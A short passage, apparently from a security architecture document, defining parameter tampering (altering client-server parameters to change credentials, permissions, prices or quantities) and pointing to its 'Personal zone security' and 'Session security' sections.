It is based on the manipulation of parameters exchanged between client
and server in order to modify application data, such as user credentials
and permissions, price and quantity of products, etc.

Reference security architecture section: "Personal zone
security"/"Session security"

